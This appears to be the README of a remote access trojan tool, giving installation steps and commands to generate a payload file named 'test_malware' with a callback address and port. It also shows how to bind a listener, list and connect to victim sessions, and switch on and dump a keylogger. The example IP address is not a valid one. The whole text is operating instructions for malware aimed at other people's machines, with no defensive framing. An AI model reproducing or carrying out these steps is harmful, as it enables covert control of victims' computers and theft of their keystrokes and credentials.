
### Installation

```
$ Install python > 3.6
$ git clone https://github.com/starcheek/rat.git
$ cd rat/
$ pip3 install -r requirements.txt
```

To start
 - cd main
 - python main.py help 

From there, the manual will guide you.


Examples:

```
$ python main.py generate --address 134.276.92.1 --port 2999 --output ./test_malware
```

```
$ python main.py bind --address 134.276.92.1 --port 2999
```

### Connections
All the connections will be listed under **sessions** command:
```
$ sessions
```

You can connect to you target session with **connect** command and launch one of available commands: 
```
$ connect ID
$ keylogger on
$ keylogger dump
```